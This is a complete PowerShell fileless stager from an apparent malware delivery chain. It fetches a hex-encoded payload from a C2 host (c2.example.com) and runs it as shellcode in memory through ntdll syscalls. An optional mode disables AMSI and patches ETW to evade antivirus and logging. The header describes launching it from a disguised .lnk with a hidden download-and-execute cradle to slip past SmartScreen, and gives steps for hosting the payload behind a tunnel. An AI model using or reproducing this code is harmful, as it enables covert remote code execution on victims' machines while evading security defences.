<#
    stage.ps1 - fileless in-memory stager for the umbra delivery chain.

    What it does
    ------------
    1. Downloads a *hex-encoded* payload blob from a URL (nothing executable is
       ever written to disk).
    2. Decodes it to a byte[].
    3. Allocates RW memory in the current process via ntdll Nt* syscalls
       (P/Invoke, so the calls go straight to ntdll - no Win32 wrapper, no file
       for AV to inspect on disk).
    4. Copies the blob, flips it to RX, and starts it on a new thread.

    This is the "stage" half of LNK_MODE=stager: the disguised .lnk runs
        cmd -> powershell -w hidden -nop -ep bypass -c "IEX(...stage.ps1)"
    and this script pulls the blob and runs it in memory. Because the whole
    chain is PowerShell + ntdll, no .exe is dropped, so there is nothing for
    SmartScreen's "first run" reputation check to flag.

    Server side (Kali): expose the hex blob, e.g.
        bash scripts/make_shellcode.sh --from-pe dist/loader.exe   # -> dist/blob.hex
        bash scripts/serve.sh          # static origin on 127.0.0.1:8080
        bash scripts/cf_tunnel.sh      # publishes it as https://c2.example.com
        # then the blob is reachable at https://c2.example.com/blob.hex

    Run (normally invoked by the .lnk cradle, but works standalone for testing):
        powershell -w hidden -nop -ep bypass -File stage.ps1 -Url https://c2.example.com/blob.hex

    USE ONLY ON SYSTEMS YOU ARE AUTHORIZED TO TEST.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string] $Url,

    # Optional: patch AMSI + ETW in this process before running the blob.
    [switch] $Patch,

    # Optional: seconds to wait for the payload thread (0 = don't wait).
    [int] $WaitSeconds = 0
)

Set-StrictMode -Version 2
$ErrorActionPreference = 'Stop'

# --- native layer: ntdll syscalls + a little Win32 glue ------------------------
Add-Type -Namespace Umbra -Name Native -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr GetModuleHandle(string name);
[DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
public static extern IntPtr GetProcAddress(IntPtr h, string proc);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint flNew, out uint flOld);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr CreateThread(IntPtr attrs, UIntPtr stack, IntPtr start, IntPtr param, uint flags, out uint id);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern uint WaitForSingleObject(IntPtr h, uint ms);

[DllImport("ntdll.dll")]
public static extern int NtAllocateVirtualMemory(IntPtr proc, ref IntPtr baseAddr,
    UIntPtr zeroBits, ref UIntPtr regionSize, uint allocType, uint protect);
[DllImport("ntdll.dll")]
public static extern int NtWriteVirtualMemory(IntPtr proc, IntPtr baseAddr,
    byte[] buffer, UIntPtr size, out UIntPtr written);
[DllImport("ntdll.dll")]
public static extern int NtProtectVirtualMemory(IntPtr proc, ref IntPtr baseAddr,
    ref UIntPtr regionSize, uint newProtect, out uint oldProtect);
[DllImport("ntdll.dll")]
public static extern int NtCreateThreadEx(out IntPtr thread, uint access,
    IntPtr attrs, IntPtr proc, IntPtr start, IntPtr param, uint flags,
    UIntPtr stackZero, UIntPtr stackCommit, UIntPtr stackReserve, IntPtr attrsList);
'@

$MEM_COMMIT      = 0x1000
$MEM_RESERVE     = 0x2000
$PAGE_READWRITE  = 0x04
$PAGE_EXECUTE_RW = 0x40
$PROC_SELF       = [IntPtr](-1)     # NtCurrentProcess() pseudo-handle

# --- optional: neutralise AMSI / ETW for this PowerShell process ---------------
# Purely in-process; no files, no services. Skipped unless -Patch is given.
if ($Patch) {
    try {
        # Flip amsiInitFailed so every AmsiScanBuffer returns clean.
        $ctx = [System.Management.Automation.AmsiUtils]
        $f = $ctx.GetField('amsiInitFailed',
                           [System.Reflection.BindingFlags]'NonPublic,Static')
        $f.SetValue($null, $true)
    } catch { }

    try {
        # Patch EtwEventWrite -> ret in ntdll.
        $nt = [Umbra.Native]::GetModuleHandle('ntdll.dll')
        if ($nt -ne [IntPtr]::Zero) {
            $etw = [Umbra.Native]::GetProcAddress($nt, 'EtwEventWrite')
            if ($etw -ne [IntPtr]::Zero) {
                $oldProt = [uint32]0
                [Umbra.Native]::VirtualProtect($etw, [UIntPtr]4, 0x40, [ref]$oldProt) | Out-Null
                [System.Runtime.InteropServices.Marshal]::WriteByte($etw, 0xC3)  # ret
                [Umbra.Native]::VirtualProtect($etw, [UIntPtr]4, $oldProt, [ref]$oldProt) | Out-Null
            }
        }
    } catch { }
}

function Get-Bytes {
    param([string] $Address)
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
    $raw = $wc.DownloadString($Address)
    # Tolerate whitespace/newlines in the hex file.
    $hex = ($raw -replace '[^0-9A-Fa-f]', '')
    if ($hex.Length -eq 0 -or ($hex.Length % 2) -ne 0) {
        throw "payload at $Address is not valid hex"
    }
    $len = [int]($hex.Length / 2)
    $buf = New-Object byte[] $len
    for ($i = 0; $i -lt $len; $i++) {
        $buf[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
    }
    return $buf
}

# --- 1/2. fetch + decode -------------------------------------------------------
Write-Verbose "downloading payload from $Url"
$blob = Get-Bytes -Address $Url
if ($blob.Length -lt 16) { throw "payload too small ($($blob.Length) bytes)" }

# --- 3. allocate RW, copy, protect RX -----------------------------------------
$size = [UIntPtr]::new([uint64]$blob.Length)
$base = [IntPtr]::Zero
$st = [Umbra.Native]::NtAllocateVirtualMemory($PROC_SELF, [ref]$base, [UIntPtr]::Zero,
        [ref]$size, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_READWRITE)
if ($st -ne 0 -or $base -eq [IntPtr]::Zero) { throw ("NtAllocateVirtualMemory 0x{0:X}" -f $st) }

$written = [UIntPtr]::Zero
$st = [Umbra.Native]::NtWriteVirtualMemory($PROC_SELF, $base, $blob,
        [UIntPtr]::new([uint64]$blob.Length), [ref]$written)
if ($st -ne 0) { throw ("NtWriteVirtualMemory 0x{0:X}" -f $st) }

$psize = [UIntPtr]::new([uint64]$blob.Length)
$oldProt = [uint32]0
$st = [Umbra.Native]::NtProtectVirtualMemory($PROC_SELF, [ref]$base, [ref]$psize,
        $PAGE_EXECUTE_RW, [ref]$oldProt)
if ($st -ne 0) { throw ("NtProtectVirtualMemory 0x{0:X}" -f $st) }

# --- 4. run on a new thread ----------------------------------------------------
$hThread = [IntPtr]::Zero
$st = [Umbra.Native]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero,
        $PROC_SELF, $base, [IntPtr]::Zero, 0, [UIntPtr]::Zero, [UIntPtr]::Zero,
        [UIntPtr]::Zero, [IntPtr]::Zero)

# Fall back to CreateThread if NtCreateThreadEx is unavailable/blocked.
if ($st -ne 0 -or $hThread -eq [IntPtr]::Zero -or $hThread -eq [IntPtr](-1)) {
    $tid = [uint32]0
    $hThread = [Umbra.Native]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $base,
                [IntPtr]::Zero, 0, [ref]$tid)
    if ($hThread -eq [IntPtr]::Zero) { throw "CreateThread failed" }
}

Write-Verbose ("payload running at 0x{0:X} ({1} bytes)" -f [int64]$base, $blob.Length)

if ($WaitSeconds -gt 0) {
    [Umbra.Native]::WaitForSingleObject($hThread, [uint32]($WaitSeconds * 1000)) | Out-Null
}
